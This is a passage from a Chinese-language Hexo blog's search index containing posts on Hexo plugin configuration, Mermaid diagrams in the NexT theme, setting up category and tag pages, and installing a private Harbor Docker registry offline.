class=\"attr\">&quot;hexo-auto-excerpt&quot;:</span> <span class=\"string\">&quot;^1.1.0&quot;</span>,              <span class=\"comment\"># 首页显示文章摘要，而非全文</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-deployer-git&quot;:</span> <span class=\"string\">&quot;^4.0.0&quot;</span>,              <span class=\"comment\"># git 远程发布</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-filter-mermaid-diagrams&quot;:</span> <span class=\"string\">&quot;^1.0.5&quot;</span>,   <span class=\"comment\"># mermaid 流程图的插件</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-archive&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,         <span class=\"comment\"># 生成归档信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-category&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,        <span class=\"comment\"># 生成分类信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-index&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,           <span class=\"comment\"># 生成目录信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-searchdb&quot;:</span> <span class=\"string\">&quot;^1.4.1&quot;</span>,        <span class=\"comment\"># 生成本地搜索数据库</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-tag&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,             <span class=\"comment\"># 生成标记信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-ejs&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,              <span class=\"comment\"># EJS 渲染引擎，支持 v3 版本</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-marked&quot;:</span> <span class=\"string\">&quot;^6.1.1&quot;</span>,           <span class=\"comment\"># Markdown 渲染引擎</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-stylus&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,           <span class=\"comment\"># Stylus CSS 解析引擎</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-server&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,                    <span class=\"comment\"># 本地 Web 服务器</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-theme-next&quot;:</span> <span class=\"string\">&quot;^8.18.2&quot;</span>,               <span class=\"comment\"># Next 主题</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-word-counter&quot;:</span> <span class=\"string\">&quot;0.1.0&quot;</span>                <span class=\"comment\"># 字数统计的插件</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"config-yml-配置信息\"><a href=\"#config-yml-配置信息\" class=\"headerlink\" title=\"_config.yml 配置信息\"></a>_config.yml 配置信息</h2><p>注意需修改 hexo 的主配置文件！然后，根据需要相应调整 Next 的配置文件。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">post_asset_folder:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">marked:</span></span><br><span class=\"line\">  <span class=\"attr\">prependRoot:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">postAsset:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">dompurify:</span> <span class=\"literal\">false</span>  <span class=\"comment\"># 默认启用HTML标签净化，将导致markdown代码渲染失败</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更新说明\"><a href=\"#更新说明\" class=\"headerlink\" title=\"更新说明\"></a>更新说明</h2><p>出于 HTML 安全考虑，新版本的<a href=\"https://github.com/hexojs/hexo-renderer-marked\">hexo-renderer-marked</a> 嵌入了<a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a>，但经常造成渲染异常，已建议采用新的插件 <a href=\"https://github.com/hexojs/hexo-renderer-markdown-it/\">hexo-renderer-markdown-it</a>。</p>\n<p><a href=\"https://github.com/ashisherc/hexo-auto-excerpt\">hexo-auto-excerpt</a>插件通常用于显示文章摘要，已改为独立安装插件，而非进行配置；但由于 HTML 难以准确截断，推荐采用<code>&lt;!-- more --&gt;</code>标签在文章内部进行显式截断。<br>注意！默认版本 1.1.0 正常，但强制升级到最新 1.1.2 可能造成首页渲染错位</p>\n<p>Hexo 默认安装了 hexo-renderer-marked 和 hexo-renderer-ejs，因此你不仅可以用 Markdown 写作，你还可以用 EJS 写作。如果你安装了 hexo-renderer-pug，你甚至可以用 Pug 模板语言书写文章。只需要将文章的扩展名从 md 改成 ejs。</p>\n<p>早期 Next 主题的版本库位于：<a href=\"https://github.com/theme-next/hexo-theme-next\">theme-next&#x2F;hexo-theme-next</a>，由于开发团队的内部矛盾而长期无法更新…于是部分开发者又搞了一个新版本：<a href=\"https://github.com/next-theme/hexo-theme-next\">next-theme&#x2F;hexo-theme-next</a>，这就是 5.x 版本升级到 8.x 版本的重大变换，主要改造点：</p>\n<ul>\n<li>将配置文件移动到最外层，使用<code>_config.next.yml</code>，目的是后续的主题更新只需<code>git pull</code>，不需要担心配置文件冲突或者丢失的问题</li>\n<li>把库文件独立出来：<a href=\"https://github.com/next-theme/plugins\">@next-theme&#x2F;plugins</a>；该插件需要独立安装，且版本号务必相同</li>\n<li>模板格式从 swig 调整为 njk</li>\n<li>保留 git 安装方式，但也可以支持 npm</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.imczw.com/post/tech/hexo5-next8-updated.html\">Hexo-5.x 与 NexT-8.x 跨版本升级</a></li>\n<li><a href=\"https://bugwz.com/2019/09/17/hexo-markdown-renderer/\">Hexo的多种Markdown渲染器对比分析</a></li>\n</ul>\n"},{"title":"HEXO的Next主题引入mermaid流程图插件","url":"/2022/04/10/HEXO%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%BC%95%E5%85%A5mermaid%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%8F%92%E4%BB%B6/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Mermaid(美人鱼)是一种基于Javascript的绘图工具，使用类似于Markdown的语法，使用户可以方便快捷地通过代码创建图表。<br>项目地址：<a href=\"https://github.com/mermaid-js/mermaid\">https://github.com/mermaid-js/mermaid</a></p>\n<p>Mermaid支持以下类型的图形：</p>\n<ul>\n<li>流程图：使用<code>graph</code>关键字，具体用法后文将详细介绍</li>\n<li>饼状图：使用<code>pie</code>关键字，具体用法后文将详细介绍</li>\n<li>序列图：使用<code>sequenceDiagram</code>关键字</li>\n<li>甘特图：使用<code>gantt</code>关键字</li>\n<li>类图：使用<code>classDiagram</code>关键字</li>\n<li>状态图：使用<code>stateDiagram</code>关键字</li>\n<li>用户旅程图：使用<code>journey</code>关键字</li>\n</ul>\n<h2 id=\"二、HEXO如何引入mermaid插件\"><a href=\"#二、HEXO如何引入mermaid插件\" class=\"headerlink\" title=\"二、HEXO如何引入mermaid插件\"></a>二、HEXO如何引入mermaid插件</h2><p>对于<code>hexo-theme-next</code>主题插件，从<code>8.11.0</code>版本开始内置mermaid支持，不再需要手工安装js模版文件了，具体步骤为：</p>\n<ol>\n<li><p>确认<code>hexo-theme-next</code>的版本号高于<code>8.11.0</code></p>\n</li>\n<li><p>确认已安装<code>hexo-filter-mermaid-diagrams</code>，当前版本号是<code>1.0.5</code>；如果没有安装，则：</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-filter-mermaid-diagrams</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>找到位于HEXO根目录的<code>_config.next.yml</code>，寻找<code>mermaid</code>段落并设置开关<code>enable: true</code></p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Mermaid tag</span></span><br><span class=\"line\"><span class=\"attr\">mermaid:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">false</span> <span class=\"comment\"># 此处修改为true！！！</span></span><br><span class=\"line\">  <span class=\"comment\"># Available themes: default | dark | forest | neutral</span></span><br><span class=\"line\">  <span class=\"attr\">theme:</span></span><br><span class=\"line\">    <span class=\"attr\">light:</span> <span class=\"string\">default</span></span><br><span class=\"line\">    <span class=\"attr\">dark:</span> <span class=\"string\">dark</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此时应该可以在文档中编写并展现流程图了。<br>如果不能正常展示，可能需要重新生成js文件，输入命令:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm clean &amp;&amp; npm generate &amp;&amp; npm server</span><br></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>其实，vscode也可以引入mermaid，其插件名称是<code>Markdown-preview-enhanced</code></p>\n</blockquote>\n<h2 id=\"三、常用图形示例\"><a href=\"#三、常用图形示例\" class=\"headerlink\" title=\"三、常用图形示例\"></a>三、常用图形示例</h2><p>使用时需要在代码块声明中标注<strong>mermaid</strong>，然后内容体中表明图形类型，再逐一描述各个节点信息。<br><img src=\"/2022/04/10/HEXO%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%BC%95%E5%85%A5mermaid%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%8F%92%E4%BB%B6/code.png\" alt=\"代码块示例\"></p>\n<h3 id=\"1-流程图（graph关键字）\"><a href=\"#1-流程图（graph关键字）\" class=\"headerlink\" title=\"1. 流程图（graph关键字）\"></a>1. 流程图（graph关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">graph TD</span><br><span class=\"line\">  A[Christmas] --&gt;|Get money| B(Go shopping)</span><br><span class=\"line\">  B --&gt; C&#123;Let me think&#125;</span><br><span class=\"line\">  C --&gt;|One| D[Laptop]</span><br><span class=\"line\">  C --&gt;|Two| E[iPhone]</span><br><span class=\"line\">  C --&gt;|Three| F[fa:fa-car Car]</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">graph TD\n  A[Christmas] -->|Get money| B(Go shopping)\n  B --> C{Let me think}\n  C -->|One| D[Laptop]\n  C -->|Two| E[iPhone]\n  C -->|Three| F[fa:fa-car Car]</pre>\n\n<h3 id=\"2-饼图（pie关键字）\"><a href=\"#2-饼图（pie关键字）\" class=\"headerlink\" title=\"2. 饼图（pie关键字）\"></a>2. 饼图（pie关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">pie</span><br><span class=\"line\">  title 为什么总是宅在家里？</span><br><span class=\"line\">  &quot;喜欢宅&quot; : 15</span><br><span class=\"line\">  &quot;天气太热或太冷&quot; : 20</span><br><span class=\"line\">  &quot;穷&quot; : 500</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">pie\n  title 为什么总是宅在家里？\n  \"喜欢宅\" : 15\n  \"天气太热或太冷\" : 20\n  \"穷\" : 500</pre>\n\n<blockquote>\n<p>饼图最多支持9种不同的颜色</p>\n</blockquote>\n<h3 id=\"3-时序图（sequenceDiagram关键字）\"><a href=\"#3-时序图（sequenceDiagram关键字）\" class=\"headerlink\" title=\"3. 时序图（sequenceDiagram关键字）\"></a>3. 时序图（sequenceDiagram关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">  Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class=\"line\">  loop Healthcheck</span><br><span class=\"line\">      John-&gt;&gt;John: Fight against hypochondria</span><br><span class=\"line\">  end</span><br><span class=\"line\">  Note right of John: Rational thoughts!</span><br><span class=\"line\">  John--&gt;&gt;Alice: Great!</span><br><span class=\"line\">  John-&gt;&gt;Bob: How about you?</span><br><span class=\"line\">  Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">sequenceDiagram\n  Alice->>John: Hello John, how are you?\n  loop Healthcheck\n      John->>John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John-->>Alice: Great!\n  John->>Bob: How about you?\n  Bob-->>John: Jolly good!</pre>\n\n<h3 id=\"4-甘特图（gantt关键字）\"><a href=\"#4-甘特图（gantt关键字）\" class=\"headerlink\" title=\"4. 甘特图（gantt关键字）\"></a>4. 甘特图（gantt关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">section Section</span><br><span class=\"line\">  Completed :done, des1, 2014-01-06,2014-01-08</span><br><span class=\"line\">  Active       : active, des2, 2014-01-07, 3d</span><br><span class=\"line\">  Parallel 1   : des3, after des1, 1d</span><br><span class=\"line\">  Parallel 2   : des4, after des1, 1d</span><br><span class=\"line\">  Parallel 3   : des5, after des3, 1d</span><br><span class=\"line\">  Parallel 4   : des6, after des4, 1d</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">gantt\nsection Section\n  Completed :done, des1, 2014-01-06,2014-01-08\n  Active       : active, des2, 2014-01-07, 3d\n  Parallel 1   : des3, after des1, 1d\n  Parallel 2   : des4, after des1, 1d\n  Parallel 3   : des5, after des3, 1d\n  Parallel 4   : des6, after des4, 1d</pre>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid\">mermaid 官方源码</a></li>\n<li><a href=\"https://github.com/webappdevelp/hexo-filter-mermaid-diagrams\">hexo-filter-mermaid-diagrams 的官方源码</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/355997933\">重点推荐！Mermaid从入门到入土——Markdown进阶语法</a></li>\n<li><a href=\"https://juejin.cn/post/7030074642559664135\">利用 Markdown 语法画 mermaid 流程图</a></li>\n</ul>\n"},{"title":"HEXO设置About, Categories, Tags页面的方法","url":"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<h2 id=\"添加关于页面\"><a href=\"#添加关于页面\" class=\"headerlink\" title=\"添加关于页面\"></a>添加<code>关于</code>页面</h2><ul>\n<li>运行hexo新建一个名为<code>about</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;about&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/about/index.md</code>文件，自由编辑并存盘</li>\n</ul>\n<h2 id=\"添加分类页面\"><a href=\"#添加分类页面\" class=\"headerlink\" title=\"添加分类页面\"></a>添加<code>分类</code>页面</h2><ul>\n<li>打开<strong>项目配置文件</strong>，设置所有分类的属性和目录名</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/_config.yml</span><br><span class=\"line\"></span><br><span class=\"line\">default_category: uncategorized</span><br><span class=\"line\">category_map:</span><br><span class=\"line\">\t编程: programming</span><br><span class=\"line\">\t生活: life</span><br><span class=\"line\">\t其他: other</span><br><span class=\"line\">tag_map:</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>运行hexo新建一个名为<code>caterogies</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/caterogies/index.md</code>文件，确认<code>type</code>的设置信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/caterogies/index.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: 分类</span><br><span class=\"line\">date: 2014-12-22 12:39:04</span><br><span class=\"line\">type: &quot;categories&quot;</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"添加标签页面\"><a href=\"#添加标签页面\" class=\"headerlink\" title=\"添加标签页面\"></a>添加<code>标签</code>页面</h3><ul>\n<li>运行hexo新建一个名为<code>tags</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/tags/index.md</code>文件，确认<code>type</code>的设置信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/tags/index.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: 分类</span><br><span class=\"line\">date: 2014-12-22 12:39:04</span><br><span class=\"line\">type: &quot;tags&quot;</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置menu的入口\"><a href=\"#设置menu的入口\" class=\"headerlink\" title=\"设置menu的入口\"></a>设置<code>menu</code>的入口</h3><ul>\n<li>设置<strong>主题配置文件</strong>的 menu\b信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/themes/next/_config.yml</span><br><span class=\"line\">menu:</span><br><span class=\"line\">  home: /                       //主页，默认</span><br><span class=\"line\">  categories: /categories       //分类，自定义</span><br><span class=\"line\">  archives: /archives           //归档，默认</span><br><span class=\"line\">  tags: /tags                   //标签，自定义</span><br><span class=\"line\">  about: /about                 //关于，自定义           </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何使用标签和分类信息\"><a href=\"#如何使用标签和分类信息\" class=\"headerlink\" title=\"如何使用标签和分类信息\"></a>如何使用<code>标签</code>和<code>分类</code>信息</h3><ul>\n<li>在个人md文件的注释信息中，可以添加<strong>catagories</strong>和<strong>tags</strong>信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/_posts/hello-world.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: hello-world</span><br><span class=\"line\">categories:</span><br><span class=\"line\">    - 生活                        （这个就是文章的分类了）</span><br><span class=\"line\">tags:</span><br><span class=\"line\">    - 生活                       </span><br><span class=\"line\">    - 有病                        （这个就是文章的标签了）</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>如果用户md文件设置了分类和标签的注释信息，hexo在生成页面时将自动进行索引</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>打开blog主页，顶层菜单出现了<strong>About</strong>、<strong>Catagories</strong>和<strong>Tags</strong>的入口，点击进去就可以使用了</li>\n</ul>\n<p><strong>tags的页面效果</strong></p>\n<img src=\"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/tags.png\" class=\"\" title=\"这是tags的图片说明\">\n\n<p><strong>categories的页面效果</strong></p>\n<img src=\"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/categories.png\" class=\"\" title=\"这是categories的图片说明\">\n","categories":["编程"],"tags":["hexo","操作手册"]},{"title":"Harbor的安装记录","url":"/2020/07/12/Harbor%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"系统规划\"><a href=\"#系统规划\" class=\"headerlink\" title=\"系统规划\"></a>系统规划</h2><p>镜像仓库作为Kubernets集群的重要基础设施，必须考虑在内网的互联网隔离问题。<br>Docker虽然自带了Registry，但是不能提供细粒度的权限设置，此外，在大型集群中为了解决镜像拉取的性能瓶颈，经常需要解决多级镜像的同步问题，因此Harbor已经成为事实标准，为此本文研究了如何在内网离线安装Harbor。</p>\n<p>基线版本的信息如下：</p>\n<pre><code>- Centos=7.8\n- Docker-CE=19.03.12\n- Docker-compose=1.21.2\n- Harbor=v1.10.3 \n</code></pre>\n<p>Harbor目前采用http方式，Admin URL：<a href=\"http://192.168.0.130:7350/\">http://192.168.0.130:7350</a><br>Harbor用户数据的存放目录：<code>/data/harbor</code>。为避免重装系统造成数据丢失，采用一个独立硬盘mount到&#x2F;data。</p>\n<h2 id=\"Harbor-Server的安装步骤\"><a href=\"#Harbor-Server的安装步骤\" class=\"headerlink\" title=\"Harbor Server的安装步骤\"></a>Harbor Server的安装步骤</h2><ol>\n<li><p>安装docker-ce、docker-compose</p>\n<p> 通过阿里云的镜像加速服务，yum安装docker-ce，详细操作方式参见<a href=\"https://blog.caogo.cn/2020/06/25/Kubernetes%E9%9B%86%E7%BE%A4%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/\">Kubernetes集群的安装记录</a></p>\n<p> docker-compose的标准安装方法是从docker.com下载，速度太慢无法忍受。<br> 还好，阿里云提供了<a href=\"http://mirrors.aliyun.com/docker-toolbox/linux/\">Docker-toolbox的下载地址</a>。<br> 注意：要手工改文件名，设置执行权限，并搬到PATH路径下。</p>\n</li>\n<li><p>下载harbor安装包</p>\n<p> 这里是<a href=\"https://github.com/goharbor/harbor/releases/tag/v1.10.3\">Harbor v1.10.3 下载地址</a>，解压后放在目录<code>/root/harbor/</code>下。<br> 离线方式的安装包有600M+，其中包含了全部所需的镜像文件，后续安装中通过<code>docker load</code>方式直接读取压缩包，就不需要联网了。</p>\n<blockquote>\n<p>v1.10.2有个bug无法正常安装，表现是log容器启动时，爆出sudo权限过期，可能是基础镜像的问题)</p>\n</blockquote>\n</li>\n<li><p>配置并安装harbor</p>\n<p> 在启动目录<code>/root/harbor/</code>下，编辑Harbor配置文件<code>harbor.yml</code>，关键信息如下：</p>\n<pre><code> <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">hostname：192.168.0.130</span></span><br><span class=\"line\"><span class=\"string\">http：</span></span><br><span class=\"line\"><span class=\"string\">port：7350</span></span><br><span class=\"line\"><span class=\"comment\"># https:</span></span><br><span class=\"line\"><span class=\"attr\">data_volume:</span> <span class=\"string\">/data/harbor/</span></span><br></pre></td></tr></table></figure>\n</code></pre>\n<p> 运行命令<code>install.sh</code>，自动拉取压缩包的镜像文件，并生成<code>docker-compose.yml</code>，这就是以后的部署配置。<br> 最后，Harbor主目录的结构是这样的：</p>\n<pre><code> <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@dnsmasq harbor]<span class=\"comment\"># tree /root/harbor -L 2</span></span><br><span class=\"line\">/root/harbor                    <span class=\"comment\">## Harbor Sever的主目录</span></span><br><span class=\"line\">├── common</span><br><span class=\"line\">│   └── config</span><br><span class=\"line\">├── common.sh   </span><br><span class=\"line\">├── docker-compose.yml          <span class=\"comment\">## 最后生成的Depolyment配置文件</span></span><br><span class=\"line\">├── harbor.v1.10.3.tar.gz       <span class=\"comment\">## 离线安装的镜像文件包，docker save &amp;&amp; docker load</span></span><br><span class=\"line\">├── harbor.yml                  <span class=\"comment\">## 初始化安装的配置文件</span></span><br><span class=\"line\">├── install.sh                  <span class=\"comment\">## 安装入口程序</span></span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">└── prepare</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n<li><p>启动harbor并检查</p>\n<p> 通过<code>docker-compose up -d --build</code>启动Harbor，然后就可以通过浏览器访问<a href=\"http://192.168.0.130:7350/\">http://192.168.0.130:7350</a><br> 在浏览器界面，输入用户名和密码，就可以看见镜像仓库的具体信息了。</p>\n</li>\n</ol>\n<h2 id=\"Client的使用方法\"><a href=\"#Client的使用方法\" class=\"headerlink\" title=\"Client的使用方法\"></a>Client的使用方法</h2><p>需要注意的是，Client的docker是独立的配置，如果不需要上传镜像，根本不用登录Harbor Server，直接设置mirror镜像就可以了。</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">    &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;storage-driver&quot;: &quot;overlay2&quot;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;insecure-registries&quot;: [</span></span><br><span class=\"line\"><span class=\"string\">    &quot;192.168.0.130:7350&quot;</span></span><br><span class=\"line\"><span class=\"string\">    ],</span></span><br><span class=\"line\"><span class=\"string\">    &quot;registry-mirrors&quot;: [</span></span><br><span class=\"line\"><span class=\"string\">        &quot;http://192.168.0.130:7350&quot;</span></span><br><span class=\"line\"><span class=\"string\">    ]</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\">docker info</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>当然，注意由于私有仓库是http模式，需要显示设置insecure-registries的不安全访问方式。<br>修改配置文件后，还需要重启守护进程和docker.service，然后你就可以正常使用私有仓库Harbor了！！！</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker login http://192.168.0.130:7350 -u admin -p xxxxxx</span></span><br><span class=\"line\">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class=\"line\">WARNING! Your password will be stored unencrypted <span class=\"keyword\">in</span> /root/.docker/config.json.</span><br><span class=\"line\">Configure a credential helper to remove this warning. See</span><br><span class=\"line\">https://docs.docker.com/engine/reference/commandline/login/<span class=\"comment\">#credentials-store</span></span><br><span class=\"line\"></span><br><span class=\"line\">Login Succeeded</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker tag python:3.7-slim 192.168.0.130:7350/library/python:3.7-slim</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker push 192.168.0.130:7350/library/python:3.7-slim</span></span><br><span class=\"line\">The push refers to repository [192.168.0.130:7350/library/python]</span><br><span class=\"line\">0c6163f2d025: Pushed</span><br><span class=\"line\">361df01300cf: Pushed</span><br><span class=\"line\">8f9ba0be9040: Pushed</span><br><span class=\"line\">0bd71a837902: Layer already exists</span><br><span class=\"line\">13cb14c2acd3: Layer already exists</span><br><span class=\"line\">3.7-slim: digest: sha256:e0f6a4df17d5707637fa3557ab266f44dddc46ebfc82b0f1dbe725103961da4e size: 1370</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>现在admin界面，就可以找到这个镜像了，以后就可以直接本地拉取了。</p>\n<img src=\"/2020/07/12/Harbor%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/admin.png\" class=\"\">\n\n<h2 id=\"HTPPS访问的设置方法\"><a href=\"#HTPPS访问的设置方法\" class=\"headerlink\" title=\"HTPPS访问的设置方法\"></a>HTPPS访问的设置方法</h2><p>可以采用基于IP地址的访问方式，但是更推荐采用域名方式，具体步骤参见<a href=\"https://blog.csdn.net/networken/article/details/107502461\">harbor安装并配置https</a><br>主要包括以下环节：</p>\n<ul>\n<li>生成证书颁发机构证书：ca.key，ca.csr</li>\n<li>生成服务器证书： harbor.caogo.local.key, harbor.caogo.local.crt, v3.ext</li>\n<li>提供证书给Harbor和Docker: 注意Docker默认使用.cert文件，而非.crt</li>\n<li>部署或重新配置harbor: 编辑harbor.yml，运行install.sh进行设置，通过docker-compose启动</li>\n</ul>\n<p>也可以参见<a href=\"https://goharbor.io/docs/2.0.0/install-config/configure-https/\">Harbor配置HTTPS的官方文档</a></p>\n<p>配置HTTPS方式后，客户端Docker访问Harbor就可以不需要设置<code>unsecure-registries</code>参数了。</p>\n<blockquote>\n<p>个人强烈推荐Http方式，而不是Https方式！！！<br>因为自签名证书需要客户端Docker配合导入证书，而真实域名证书受到ECS出口带宽限制，速度很感人！</p>\n</blockquote>\n<hr>\n<h3 id=\"自制的image-push小工具（还要优化……）\"><a href=\"#自制的image-push小工具（还要优化……）\" class=\"headerlink\" title=\"自制的image push小工具（还要优化……）\"></a>自制的image push小工具（还要优化……）</h3><pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; harbor-push.sh &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/bash </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">count=1</span></span><br><span class=\"line\"><span class=\"string\">while read repo tag others   # 从docker images的输出中获得镜像信息，注意剔除第一行 </span></span><br><span class=\"line\"><span class=\"string\">do </span></span><br><span class=\"line\"><span class=\"string\">    src_image=$repo&quot;:&quot;$tag</span></span><br><span class=\"line\"><span class=\"string\">    dst_image=192.168.0.130:7350/library/$src_image</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    echo &quot;$count: $src_image 